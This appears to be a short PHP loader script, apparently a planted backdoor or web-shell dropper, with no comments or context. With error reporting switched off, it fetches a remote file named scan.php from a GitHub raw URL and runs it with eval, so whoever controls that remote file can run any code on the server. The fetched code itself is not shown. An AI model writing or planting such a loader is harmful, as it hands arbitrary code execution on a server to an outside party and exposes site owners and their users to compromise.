<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/aptisme/Pathos/refs/heads/main/scan/scan.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
